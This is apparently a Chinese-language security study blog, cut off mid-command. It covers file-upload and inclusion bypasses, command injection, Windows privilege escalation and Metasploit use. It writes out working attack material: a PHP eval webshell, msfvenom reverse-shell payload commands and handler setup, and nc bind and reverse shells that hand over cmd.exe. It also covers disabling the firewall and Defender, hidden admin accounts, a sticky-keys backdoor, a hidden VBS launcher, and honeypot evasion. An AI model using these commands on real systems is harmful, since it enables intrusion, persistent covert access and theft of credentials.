title="后端对http包的检查"></a>后端对http包的检查</h5><p>提示：<strong>文件类型</strong>不正确：抓包修改http头部<strong>content-type</strong></p><blockquote><p>如：application/octet-stream换成image/jpeg</p></blockquote><p>还会对内容，文件头检查</p><p>文件头绕过：在http内容首行添加GIF89a,用图片格式头冒充php文件</p><p>内容绕过：先上传图片格式木马，再修改回php格式</p><h5 id="路径截断绕过"><a href="#路径截断绕过" class="headerlink" title="路径截断绕过"></a>路径截断绕过</h5><p><strong>00截断原理</strong>：0x00和%00经过解析后会变成chr(0)，0是ASCII中的null对应空格，从而把文件名中用于伪装传输格式的后缀名在前端解析时截断。</p><p><strong>0x00</strong>对应在hex中修改的空格，**%00<strong>在url中，如</strong>xx.php?filename=test.php%00.txt**  或者 抓包中 <strong>path=shell.jsp%00.txt</strong></p><p><strong>常见</strong>于asp，php&lt;<strong>5.3.4</strong>版本，jsp也会有，前端绕过可能有效，后端无效</p><p><strong>filename.php.0x00.jpg</strong>  Bp抓包，先在要截断的地方输入在hex进制好找的，比如空格对应hex的20，找到，改成00</p><p>前端绕过了，但是后端还会把从第一个点开始，验证后面的后缀是否等于指定的几种格式，这时即使绕过前端验证，后端也会被拦截，这时如果抓包发现有上传路径，可以把空格先放在路径中等着上传文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php实现对文件上传后缀检查与替换</span></span><br><span class="line"><span class="variable">$upload_name</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$upload_ext</span>=substr( <span class="variable">$uploaded_name</span>,strrpos(<span class="variable">$uploaded_name</span>,<span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>);<span class="comment">//从.开始向后取后缀</span></span><br><span class="line"><span class="variable">$target_name</span>=md5(uniqid().<span class="variable">$uploaded_name</span>.<span class="string">&#x27;.&#x27;</span>.<span class="variable">$uploaded_ext</span>);<span class="comment">//对上传文件重命名</span></span><br><span class="line"><span class="keyword">if</span>(strtolower(<span class="variable">$uploaded_ext</span>)==<span class="string">&#x27;jpg&#x27;</span>||strtolower(<span class="variable">$uploaded_ext</span>)==<span class="string">&#x27;jpeg&#x27;</span>||strtolower(<span class="variable">$uploaded_ext</span>)==<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dir</span>.<span class="variable">$target_name</span>);<span class="comment">//将临时文件移动到指定目录下</span></span><br><span class="line">    <span class="variable">$result</span>=<span class="variable">$dir</span>.<span class="variable">$target_name</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;stored in: <span class="subst">$result</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;invalid file&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外一种情况，有时候会用<strong>文件名拼接</strong>路径形成真正的上传路径，此时如果没有上面的后缀检查，文件名中含有空格的后缀还是可以被一起拼接到新的路径中的，空格依然生效。</p><p><strong>空格放上传路径，坐等文件拼接</strong>， 如果把空格放在上传文件名中过不了后端的安检，但是抓包中发现了上传路径，可以修改包，在路径后面添加<strong>aa.php%00</strong> 原理是，当经过安检后，到了最后文件拼接时，会被拼接形成<strong>aa.php%00/filename.jpg</strong> 此时空格生效，相当于还是把文件里面木马放到空路径aa.php中了，参考php代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$temp_file</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$is_upload</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$msg</span>=<span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/weixin_44840696/article/details/90581104">https://blog.csdn.net/weixin_44840696/article/details/90581104</a></p><h3 id="pikachu靶场——文件相关"><a href="#pikachu靶场——文件相关" class="headerlink" title="pikachu靶场——文件相关"></a>pikachu靶场——文件相关</h3><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>​        文件包含漏洞，会把文本格式的东西或者其他东西，都当作php代码来执行</p><pre><code>    本地文件包含        &lt;?php        $pifi=$_GET[&#39;pifu&#39;];        include($pifu.&#39;php&#39;);        echo &#39;url中传入pifi=pifu1或pifi2分别对应后台pifi1.php和pifu2.php，动态加载文件会使得当前页面内容简洁&#39;        ?&gt;        filename=../abcmuma.txt   include()中支持../ 也可以包含上一级        此时abcmuma.txt文件中是php代码&lt;?php phpinfo() ?&gt;  虽然txt不能直接被当做php，但文件包含时，该txt被放在include()中会被当做php执行        安全写法:白名单写死了，严格指定包含文件        if(&amp;filename==&#39;file1.php&#39;||$filename==&#39;file2.php&#39;||$filename=&#39;file3.php&#39;)     远程文件包含        phpstudy-设置-配置文件-5.6.9版本-php.ini         allow_url_include如果是On，允许远程文件包含，重启服务        filename=http://127.0.0.1:8011/abcmuma.txt        防：ini配置文件中操作</code></pre><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><pre><code>    &lt;?php eval($_POST[&#39;haha&#39;])?&gt; 一句话木马，传上去之后，url参数haha=phpinfo()  eval会把识别为php    前端拦截    关闭js    kali    nano muma.php   同样写个一句话木马    content-type拦截   burp抓包    image/jpeg    图片大小审核    制作图片一句话木马    copy 1.jpg/b+muma.php/a 2.jpg    图片一句话木马必须配合文件包含使用！！不然传上去的不被执行就没意义    windows如果有的时候无法成功    也可以使用kali！！！！    cat 1.jpg muma.php &gt; 2.jpg</code></pre><h4 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h4><p>​    php里面使用了命令执行函数<br>​    shell_exec exec system popen proc_popen pcntl_exec passthru</p><pre><code>phpstudy开启网站，index.php  &lt;?php     $ip=$_GET[&#39;ip&#39;];  //实现从url中传入需要ping的目标 【】中的就是url中的参数名称ip=xxx    shell_exec(&#39;ping&#39;.$ip)  //网站的php文件中有命令执行漏洞    $result=shell_exec(&#39;ping www.baidu.com&#39;);    echo $result;?&gt;|   左边运行结果作为右边的输入||  qr前面执行不成功就执行右边，左边运行成功就不运行右边&amp;   先运行左边后运行右边&amp;&amp;  左边运行完再运行右边;   linux中特有，左边执行完继续右边防御：上面符号替换为空ping 127.0.0.1 &amp;&amp; dirwhoami 查看我是谁ipconfig 查看ip地址（Windows，Linux使用ifconfig）net user zj 123 /add 增加用户eval(字符串)eval可以把字符串当作php代码来执行！！！eval  vs  代码执行函数： eval能让php代码执行函数起作用，php代码执行函数能让dir这种系统命令起作用，eval没法直接让dir起作用如果黑客利用了eval，在里面传入上面php代码执行的函数，那你就死了</code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限机制详解与提权操作权限维持</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9D%83%E9%99%90%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3%E4%B8%8E%E6%8F%90%E6%9D%83/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%9D%83%E9%99%90%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3%E4%B8%8E%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="操作系统提权"><a href="#操作系统提权" class="headerlink" title="操作系统提权"></a>操作系统提权</h1><h2 id="权限机制"><a href="#权限机制" class="headerlink" title="权限机制"></a>权限机制</h2><h3 id="系统权限"><a href="#系统权限" class="headerlink" title="系统权限"></a>系统权限</h3><h4 id="windows："><a href="#windows：" class="headerlink" title="windows："></a>windows：</h4><ul><li><p>administrator账户默认禁用，这会导致很多功能不可用，人类可用最高权限，在管理中可看到用户与用户组设置</p></li><li><p>system 机器可用最高权限，任务管理器中system进程通过逆向找到漏洞，可直接提权至system</p></li><li><p>others权限</p></li></ul><h4 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h4><ul><li><p>root 用户和机器可用最高权限</p></li><li><p>others权限，比如www，mysql这些服务，每一个服务都有专门的用户，对应不同的用户权限</p></li><li><p>cat /etc/passwd查看</p></li><li><p>whoami</p></li></ul><hr><h3 id="硬件权限"><a href="#硬件权限" class="headerlink" title="硬件权限"></a>硬件权限</h3><p>得到一个系统之后一般是尽可能去提高权限，其实每一个硬件也有权限</p><p>CPU：</p><p>对于中介的OS，硬件比如cpu不会把所有权限都给操作系统，</p><p>ring0权限：驱动程序的权限</p><p>ring3权限：大多数软件运行在权限</p><p>如何操控ring0权限，windows ddk编程，驱动层面，C++写键盘的钩子，直接把密码勾出来，比如QQ光标闪烁，使用ring3级别软件监听输入信息是搞不定的，会有扰乱码，此时可以尝试用ring0级别的驱动程序来记录键盘键位。</p><p><strong>理念</strong>：外挂伪装，可以自动把杀毒软件关闭，调用外挂时QQ过段时间会被打掉线，重新登录时ring0开始监听密码，然后使用邮箱（比如使用抓包抓到之后也会用邮箱（盒子邮箱：<a href="https://www.boxmail.cn/">https://www.boxmail.cn</a> 可能有关））或者用post请求提交到自己搭建的php网站上</p><p>调用ring0权限的病毒可以直接破坏硬盘</p><h4 id="u盘usb硬件木马"><a href="#u盘usb硬件木马" class="headerlink" title="u盘usb硬件木马"></a>u盘usb硬件木马</h4><p>usb接口（五角大楼入侵，仿造U盘调包）</p><p>驱动程序，u盘刚插上的瞬间，调用ring0级别</p><p>U盘改造，上面搭载存储模块，wifi模块，接口供电之后打开wifi，相当于一个微型电脑，上面可以搭载一个小网站。可以调用cmd，powershell（可以命令行下载），u盘可以被远程编程和执行</p><p>硬件编程（有时候软件需要拼技术，但是硬件一般用来打击顽固目标）</p><p>系统漏洞 0 day<br>windows漏洞建议工具github.com/chroblert/WindowsVulnScan<br>powershell中运行，扫描本地漏洞</p><h2 id="漏洞提权"><a href="#漏洞提权" class="headerlink" title="漏洞提权"></a>漏洞提权</h2><h3 id="CVE-2014-4113-提权漏洞"><a href="#CVE-2014-4113-提权漏洞" class="headerlink" title="CVE-2014-4113 提权漏洞"></a>CVE-2014-4113 提权漏洞</h3><p>CVE-2014-4113 漏洞（中国的叫CNNVE，自己找漏洞发CVE上去含金量很高），工具</p><p>win10测试该工具火绒隔离，执行win64报错[281] failed 00000000   执行win32报错[183] failed 0000007E，估计是漏洞挂掉了。</p><p>win7 ver 6.3.7601测试win64 whoami 返回系统system，提权成功</p><p>直接把net user yonghuming mima /add命令放在win64.exe后面会因为太长导致解析失败，win64.exe a.bat   将命令写入bat文件，用系统权限执行a.bat文件，执行成功。（如果文件后缀名错误为a.bat.txt会导致 返回[691] failed 00000002，换回管理员用户使用win64执行a.bat仍然报错）</p><h3 id="CVE-2014-6332-IE漏洞"><a href="#CVE-2014-6332-IE漏洞" class="headerlink" title="CVE-2014-6332 IE漏洞"></a>CVE-2014-6332 IE漏洞</h3><p>该漏洞从win98就早有了，诱导用IE打开，可以做一个假的页面</p><p>漏洞利用的前提：使用IE、未打漏洞的、未开360的；用IE打开该页面后，电脑将会新建一个admin的用户，密码也是admin,并将IP发给自己的服务器；创建隐藏帐号请参考<a href="http://www.vfocus.net/art/20090420/4976.html">http://www.vfocus.net/art/20090420/4976.html</a></p><p>将a.html放在自己网站上，用自己电脑IE访问网站，IE弹出运行脚本弹窗警告。（此时查看网页的权限如果是管理员权限，则脚本中创建用户的功能可以运行）此时net user多了个admin用户，每次刷新网页都会出来admin（即使删掉）</p><p>1nalb2.html是直接打开cmd</p><h3 id="MS12042-漏洞"><a href="#MS12042-漏洞" class="headerlink" title="MS12042 漏洞"></a>MS12042 漏洞</h3><p>成功会添加一个管理：<br>luoye 456$love</p><p>在CMD下用命令行运行test.exe     c:&gt;d:\test.exe<br>查看test.exe的pid<br>然后sysret.exe -pid [test的pid]</p><h2 id="使用msf木马提权"><a href="#使用msf木马提权" class="headerlink" title="使用msf木马提权"></a>使用msf木马提权</h2><p>msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.43.200 LPORT=4444 -e(encode) x86/shikata_ga_nai -f exe &gt; msf.exe</p><p>将在root中生产的木马传到目标上，执行，上线，同前一天基本操作</p><p>msfconsole，use exploit/multi/handler, set payload windows/meterpreter/reverse_tcp,show options, set LHOST [ip], set LPORT 4444, exploit(开始监听)，上线后，background，sessions（merterpreter help查看）</p><p>back</p><p>上面用来控制的可以是一个木马，下面可以用另一个木马进行提权</p><p>use exploit/windows/local/ms14_058</p><p>local中很多是windows用来提权的工具，直接复制google学习，会出现一些cve的漏洞，</p><p>show options,set session 1（刚刚控制的木马background的session）,exploit，如果成功会返回一个新的session号，登录新的id使用getuid，getsystem即可</p><p>这里使用ms14_058…（tab键补全）ms14_058,ms16_016目标一般是x32位系统，有必要知道local中各个工具是怎么来用的</p><hr><h2 id="进阶渠道"><a href="#进阶渠道" class="headerlink" title="进阶渠道"></a>进阶渠道</h2><h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p><a href="https://www.cvedetails.com/">https://www.cvedetails.com/</a></p><p>摸着石头过河，可以提供挖洞方向</p><h3 id="cnnvd"><a href="#cnnvd" class="headerlink" title="cnnvd"></a>cnnvd</h3><p>但凡在国内的搞到漏洞， 发到上面可以得到证书，cnnvd漏洞比较好挖，存储型xss聊天论坛啥的还收，比较好挖，反射型xss等这些由于没什么危害，似乎不收。</p><p>网站的一些漏洞也比较好挖，代码能力好的话，可以把别人企业源代码扒过来直接代码审计（类似于之前在公网上搭服务器网站的），提交漏洞需要注意证明的时候不要挂马破坏什么的，弹个窗即可。万一人家报警咋办</p><h3 id="github"><a href="#github" class="headerlink" title="github"></a>github</h3><p>关键词搜windows提权  windows漏洞 勒索病毒 等</p><p>老一点的国企企业，还是windows2003，xp等，不要有幸存者偏差。最新的系统一般都垃圾。军方还用windows98系统，因为不能出错，确保稳定。</p><p>windows2000在中国的机场很多还在用，因为稳定</p><p>大型内网渗透扫描器&amp;Cobalt Strike，2k多star的这个还可以跟msf一起使用 <a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p><p>得习惯用github学习东西。sln是c++写的。用英文搜，老外做的解释会多一点。</p><p>写简历时，可以在简历上添加一些github的链接，此处有个简历的例子（简历与github.mp3）</p><hr><h1 id="MSF提权后对目标信息的采集"><a href="#MSF提权后对目标信息的采集" class="headerlink" title="MSF提权后对目标信息的采集"></a>MSF提权后对目标信息的采集</h1><p>提权之后，先别着急拿东西</p><p>需要进入一个session（之前布置的木马）</p><h3 id="forensics"><a href="#forensics" class="headerlink" title="forensics"></a>forensics</h3><p>run post/windows/gather/forensics/xxxx 取证模块</p><h3 id="browser-history"><a href="#browser-history" class="headerlink" title="browser_history"></a>browser_history</h3><p>run post/windows/gather/forensics/browser_history 收集各个浏览器历史</p><p>火狐使用sqlite查看，<a href="https://blog.csdn.net/weixin_41489908/article/details/107072458">https://blog.csdn.net/weixin_41489908/article/details/107072458</a> SELECT url FROM moz_places</p><p>查看方式google一下</p><h3 id="enum-drives"><a href="#enum-drives" class="headerlink" title="enum_drives"></a>enum_drives</h3><p>run post/windows/gather/forensics/enum_drives 判断磁盘大小，物理磁盘drive0是一块物理磁盘总大小，看是否是正常的电脑大小，据此判断是不是蜜罐，普通人都会有好几个盘。</p><p>蜜罐专门会暴露一些菜鸟黑客都会入侵的漏洞，连接蜜罐时也在追踪你，要跑赶紧跑。</p><h3 id="checkvm"><a href="#checkvm" class="headerlink" title="checkvm"></a>checkvm</h3><p>run post/windows/gather/checkvm 检测是否是虚拟机，防止蜜罐，现在虚拟化技术成熟，用虚拟机其实也正常，但万事小心。</p><h3 id="enum-services"><a href="#enum-services" class="headerlink" title="enum_services"></a>enum_services</h3><p>run post/windows/gather/enum_services 获取开启服务信息，根据服务知道这台电脑大概是用来干嘛的。有必要的话甚至可以插入或替换服务文件，或者捆绑什么东西</p><h3 id="enum-applications"><a href="#enum-applications" class="headerlink" title="enum_applications"></a>enum_applications</h3><p>run post/windows/gather/enum_applications 查看安装应用情况，通过应用知道对方经常在干嘛。有时候有的木马需要VC++2008等类似的运行库，有些时候缺少这些donate framework木马会报错，从而暴露</p><p>run post/windows/gather/enum_shares 查看共享（没啥好看的）</p><h3 id="dumplinks"><a href="#dumplinks" class="headerlink" title="dumplinks"></a>dumplinks</h3><p>run post/windows/gather/dumplinks 查看最近操作或安装的东西，判断这台电脑最近有没有人用，有的电脑上office文档特别多，需要找最近操作的，蜜罐的话这里的recent一般是没有的，蜜罐装好之后大概率是不会去使用的。</p><h3 id="enum-patches"><a href="#enum-patches" class="headerlink" title="enum_patches"></a>enum_patches</h3><p>run post/windows/gather/enum_patches查看用户安装了哪些补丁。 这里用cmd的systeminfo可以看，但所有的系统命令都在windows system32的文件夹里，如果把系统命令删了也可以用enum_patches来查看，</p><p>通过以上信息基本确定目标是不是蜜罐</p><hr><p>cd /usr/share/metasploit-framework/scripts/resource</p><p>kali里大佬写的脚本/usr/share/metasploit-framework/scripts/meterpreter</p><p>本质上之前的命令都是通过这些用Ruby这个面向对象脚本语言写的rb脚本来实现的</p><p>tools文件夹下大佬写的很多工具，payload攻击载荷等</p><p>/usr/share/metasploit-framework/data/exploits中就有很多漏洞，有很多大佬写的漏洞利用程序拿来学习学习</p><hr><h3 id="run-scraper"><a href="#run-scraper" class="headerlink" title="run scraper"></a>run scraper</h3><p>导出所有信息</p><p>包括注册表（win神经系统）</p><h3 id="run-winenum"><a href="#run-winenum" class="headerlink" title="run winenum"></a>run winenum</h3><p>搜集系统环境变量</p><p>这两条命令纯属娱乐，getuid，getsystem，替你敲一些传统的命令，把返回结果放在指定目录下</p><hr><h3 id="you-get"><a href="#you-get" class="headerlink" title="you-get"></a>you-get</h3><p>数据包捕获</p><p>（不同于抓包）</p><p>捕获一些流媒体，视频，声音很难搞。</p><p>比较出名的有一个叫you-get，直接读取视频流这个流量，一些网站不会轻易直接让你下载</p><p>官网安装python 3.7以上解释器环境，安装python会附带安装好pip</p><p>pip install -i(通过指定源安装) <a href="https://pypi.doubanio.com/simple">https://pypi.doubanio.com/simple</a> you-get 这个库</p><p>（<a href="https://github.com/soimort/you-get%EF%BC%89">https://github.com/soimort/you-get）</a></p><p>you-get -i 视频链接</p><p>抖音抄袭的instagram，一个10w粉丝（得看什么粉）一般可以卖大几千，一万（对于专门做号的人来说10w粉丝只需要一周时间）</p><p>视频vip接口，通过流转发操作接口，只需要用一个账号就可以通用vip</p><h1 id="权限维持——后门"><a href="#权限维持——后门" class="headerlink" title="权限维持——后门"></a>权限维持——后门</h1><h2 id="win后门"><a href="#win后门" class="headerlink" title="win后门"></a>win后门</h2><h4 id="畸形文件夹"><a href="#畸形文件夹" class="headerlink" title="畸形文件夹"></a>畸形文件夹</h4><h5 id="第一种，点点文件夹"><a href="#第一种，点点文件夹" class="headerlink" title="第一种，点点文件夹"></a>第一种，点点文件夹</h5><p>​    不同具体版本，呈现方式不同<br>​    mkdir xxx..\  删不掉<br>​    eg1<br>​        此时鼠标移动图片到xxx..\中，自动跳出xxx文件夹<br>​        打开两个文件夹，里面都为空<br>​        此时右键删除xxx文件夹，图片自动在xxx..中出现<br>​        xxx..中的图片可以删，文件夹本身不能删<br>​    eg2<br>​        鼠标移动图片到xxx..中，自动跳出xxx文件夹<br>​        此时删掉xxx.. 刷新后，未删除的xxx变为了xxx.. 同时图片转移到其中<br>​    总之，xxx..文件夹本身用鼠标方式无法删除</p><pre><code>删除方式 不能用rmdir，要用rd xxx..\</code></pre><hr><h5 id="第二种，空格文件夹"><a href="#第二种，空格文件夹" class="headerlink" title="第二种，空格文件夹"></a>第二种，空格文件夹</h5><p>​    md “\test\ &quot;  鼠标删不掉，里面有两层无文件名的文件夹<br>​    鼠标移个图片进test上，里面第一层图片可访问，第二层不可访问，两层图片同出现同消失</p><p>​    删除方式 rd /s /q “c:\test”</p><h5 id="第三种，点点点文件夹"><a href="#第三种，点点点文件夹" class="headerlink" title="第三种，点点点文件夹"></a>第三种，点点点文件夹</h5><p>​    md c:...<br>​    点进去，发现里外两个世界相同，再点进去，才是空的<br>​    此时从外世界移动图片到…文件夹中，发现在里世界没有图片，在里世界的…文件夹中<br>​    此时这个里世界的…中的图片无法删除<br>​    删除方式 rmdir /s /q ...\</p><h4 id="添加用户，提权"><a href="#添加用户，提权" class="headerlink" title="添加用户，提权"></a>添加用户，提权</h4><p>​    net user 查看当前电脑的用户，或者计算机管理-本地用户和组中查看<br>​    net user zj 123 /add 添加用户zj<br>​    net user zj /del 删除用户zj<br>​    net localgroup administrators zj /add 提权<br>​    net localgroup users zj /del 离组，血统纯正<br>​    现在有win多使用命令行管理（抄linux），管理员会去检查有没有人使用net user命令<br>​    net user zj1$ 123 /add 创建隐藏用户，net user看不到，这种带$符号的反而在图形化界面看到</p><hr><h4 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h4><p>​    磁盘，右键属性，不共享，在命令行中才能看到是否真正共享<br>​    net share 查看共享<br>​    net share c$ /del 删除该共享<br>​    如果知道账户名和密码，在资源管理器中，映射网络驱动器(同一个内网中)<br>​    文件夹\192.168.1.49\c$  系统里net share默认共享名是c$，都加$</p><pre><code>net view 查看当前局域网的共享情况 （当前局域网中开共享的主机名，如果再知道账户密码和共享盘即可映射）net share wocao=c:/ 创建共享net share wocao /del 删除共享</code></pre><hr><h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><p>​    关闭防火墙<br>​    netsh advfirewall set allprofiles state off<br>​    查看防火墙状态<br>​    netsh advfirewall show allprofiles<br>​    关闭防火墙服务<br>​    net stop mpssvc</p><pre><code>-------------关闭防火墙会触发报警，单独开启某个端口配合木马连入目标netsh advfirewall firewall add rule name=&quot;nc bind shell&quot; dir=in action=allow protocol=TCP localport=8088nc -lvp 8088 -e cmd.exe黑客nc -nv [目标ip] 8088--------配合木马连出(反弹)目标netsh advirewall firewall add rule name=&quot;nc reverse shell&quot; dir=out action=allow protocol=TCP localport=8088nc -nv [黑客ip] 8088 -e cmd.exe黑客nc -lvp 8088---------不会做木马免杀(加密软件加密)的话，win10还需要通过注册表关闭defender</code></pre><hr><h4 id="消除黑框"><a href="#消除黑框" class="headerlink" title="消除黑框"></a>消除黑框</h4><p>​    b.vbe (vbs一样) (实战使用python或者go做，写到系统启动服务里面)<br>​    set ws=createobject(“wscript.shell”)<br>​    do<br>​    ws.run “c:\a.bat”,0 立即执行a.bat(里面批量写入上面一些操作，增加用户，共享，木马，注入进程服务，开启某端口，修改注册表关闭defender)<br>​    wscript.sleep 9000 毫秒<br>​    loop</p><p>把该vbe文件右键压缩，winrar(双击自解压)创建自解压文件，高级，自解压选项，解压路径，解压后运行vbe，模式，隐藏全部，文本图标等</p><h4 id="shift后门-远程登录时用到"><a href="#shift后门-远程登录时用到" class="headerlink" title="shift后门(远程登录时用到)"></a>shift后门(远程登录时用到)</h4><p>​    takeown /f c:\windows\system32\sethc.* /a /r /d y  获得所有权，把凡是sethc开头的文件<br>​    cacls c:\windows\system32\sethc.exe /T /E /G system:F  修改熟悉<br>​    cacls c:\windows\system32\sethc.exe /T /E /G administrator:F   F把权限强行给<br>​    copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe /y  y强行替换</p><h2 id="linux后门"><a href="#linux后门" class="headerlink" title="linux后门"></a>linux后门</h2><p>rsync</p><p>corntab</p><p>待续……</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻击框架</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>使用新版本的kali，旧版本106无法用，新版本需要vm15以上才可以用</p><p>metasploit 攻击框架</p><p>msfconsole 打开msf  exploits溢出，漏洞； auxiliary辅助，搜集等；nops(No Operation or Next Operation)；post后期渗透模块</p><p>nmap -sV 192.168.1.17靶机ip   大概对目标进行扫描，扫描目标主机的端口上运行的软件版本，顺带扫带端口</p><p>显示filtered表示对方有防火墙过滤</p><p>永恒之蓝漏洞   一旦扫描到目标是win7 135 445开放端口就有可能被利用</p><p>metasploit中含有各种漏洞的各种利用方式</p><p>永恒之蓝对应的漏洞是ms17-010   （别的漏洞比如古怪地鼠，翡翠纤维……也可利用）</p><p>google：影子经纪人 泄露这批漏洞</p><p>msf攻击目标所需条件：</p><p>1.知道对方有漏洞</p><p>2.攻击载荷（木马病毒，自己开发比较好）</p><h3 id="msf-开启"><a href="#msf-开启" class="headerlink" title="msf 开启"></a>msf 开启</h3><p>use exploit（s） ，旧版本会显示加载失败</p><p>display中aix是针对IBM机器的漏洞，multi是多平台，比如浏览器上的flash，http协议的漏洞，misc加密类型的漏洞，osx上safari浏览器的漏洞，solaris系统的漏洞，window的rdp远程桌面的漏洞等，</p><p>use exploit/windows/smb/</p><p>use exploit/windows/smb/ms17_010_eternalblue  使用该漏洞</p><p>show options 查看如何配置漏洞</p><p>set RHOSTS  [目标ip]   设置目标ip</p><p>默认自带攻击载荷（容易被抓）</p><p>run  运行  显示win表示成功，meterpreter表示已经拿到控制权</p><p>默认的木马功能挺多，使用help查看功能，比如：</p><p>shell 返回控制窗口exit退出shell</p><p>screenshot 抓取屏幕</p><p>exit退出msf</p><hr><h3 id="msf木马操作标准流程"><a href="#msf木马操作标准流程" class="headerlink" title="msf木马操作标准流程"></a>msf木马操作标准流程</h3><p>msf多数利用在内网渗透</p><p>在root目录下（也可以在msf环境中）生成exe木马</p><p>msfvenom(毒液，msf生成木马) -a x86 -platform windows -p(payload攻击载荷) windows/meterpreter/reverse_tcp LHOST=[自己ip] LPORT=4444  -b “\00”(对程序中00进行处理) -e（encode加密编码）（用后面的进行伪装，伪装也不好用了） x86/shikata_ga_nai -f exe &gt; msf.exe（生成并加密程序）</p><p>将生成的木马发给目标主机（火绒瞬间处理掉。。。）</p><p>进入msf，建立木马的控制端：</p><p>msfconsole </p><p>use exploit/multi/handler</p><p>set payload windows/meterpreter/reverse_tcp (这里需要设置和木马中匹配的漏洞)</p><p>show options</p><p>set LHOST [自己ip]</p><p>exploit （进入监听状态）</p><p>如果木马上线就就会连接我，这边会显示meterpreter，输入shell就可以获取目标cmd</p><p>退出meterpreter时exit是关闭木马，后台木马是background，生成session</p><p>使用sessions查看控制了多少人</p><p>sessions -i 1 进入1号主机的控制端</p><p>jobs 查看当前在执行多少工作，有时候用好几种攻击方式一起放在后台工作，就会产生job</p><p>back 后退一格，这时就可在msf后端做别的任务，使用sessions还可以查看当前攻击列表</p><p>如果不小心exit木马，从use exploit/multi/handler开始，使用exploit开始监听</p><hr><h3 id="生成其他木马命令"><a href="#生成其他木马命令" class="headerlink" title="生成其他木马命令"></a>生成其他木马命令</h3><p><strong>生成mac木马：</strong></p><p>msfvenom -a x86 –platform osx -p osx/x86/shell_reverse_tcp LHOST=自己ip LPORT=4444 -f macho(生成什么类型的) -o payload.macho</p><p>这个是比较老版本的苹果木马（苹果比较先进）</p><p>生成android木马（需要数字签名）：（）其实用kali做木马本身就很蠢）</p><p>msfvenom -a x86 –platform Android -p android/meterpreter/reverse_tcp  LHOST=自己ip LPORT=4444 -f apk -o payload.apk</p><p>生成powershell木马，（windows的powershell做的越往后面越像高级的cmd）所以也有针对此的木马</p><p>msfvenom -a x86 –platform windows -p windows/powershell_reverse_tcp LHOST =自己ip  LPORT=4444 -e cmd/powershell_base64 -i 3 -f raw -o 